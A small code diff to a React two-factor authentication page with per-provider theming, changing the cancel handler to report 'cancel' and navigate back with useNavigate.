@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useLocation } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import { ProviderKey, getProviderTheme } from './providerTheme';
 import ProviderShell from './ProviderShell';
 
@@ -10,6 +10,7 @@ interface TwoFactorPageProps {
 
 const TwoFactorPage: React.FC<TwoFactorPageProps> = ({ providerKey, onAction }) => {
   const location = useLocation();
+  const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
   const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
   const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
@@ -38,7 +39,8 @@ const TwoFactorPage: React.FC<TwoFactorPageProps> = ({ providerKey, onAction }) 
   };
   const tryAnotherWay = () => onAction('request_alternate_method', { email });
   const goBack = () => {
-    onAction('user_canceled');
+    onAction('cancel');
+    navigate(-1);
   };
 
   // Provider-styled input element.
